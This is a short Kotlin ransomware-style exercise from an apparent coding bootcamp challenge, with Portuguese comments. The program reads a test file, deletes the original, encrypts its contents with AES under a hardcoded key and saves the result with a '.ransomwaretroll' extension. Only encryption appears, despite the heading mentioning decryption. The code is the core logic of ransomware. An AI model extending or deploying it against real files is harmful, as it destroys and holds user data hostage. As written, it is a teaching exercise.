# ransomware-desafio-Dio
#Certifique-se de adicionar a biblioteca apropriada para suporte a criptografia AES no projeto Kotlin. 
#Você pode usar a biblioteca javax.crypto que faz parte do Java Standard Edition (SE)

Criptografar e descriptografar arquivo em Kotlin
import java.io.File
import java.nio.file.Files
import java.nio.file.Paths
import java.nio.file.StandardOpenOption
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

fun main() {
    // Nome do arquivo a ser criptografado
    val fileName = "teste.txt"

    // Ler dados do arquivo
    val fileData = File(fileName).readBytes()

    // Remover o arquivo original
    File(fileName).delete()

    // Chave de criptografia
    val key = "testeransomwares".toByteArray()
    val secretKey = SecretKeySpec(key, "AES")

    // Inicializar o objeto Cipher
    val cipher = Cipher.getInstance("AES")
    cipher.init(Cipher.ENCRYPT_MODE, secretKey)

    // Criptografar os dados do arquivo
    val cryptoData = cipher.doFinal(fileData)

    // Salvar o arquivo criptografado
    val newFileName = "$fileName.ransomwaretroll"
    Files.write(Paths.get(newFileName), cryptoData, StandardOpenOption.CREATE)
}
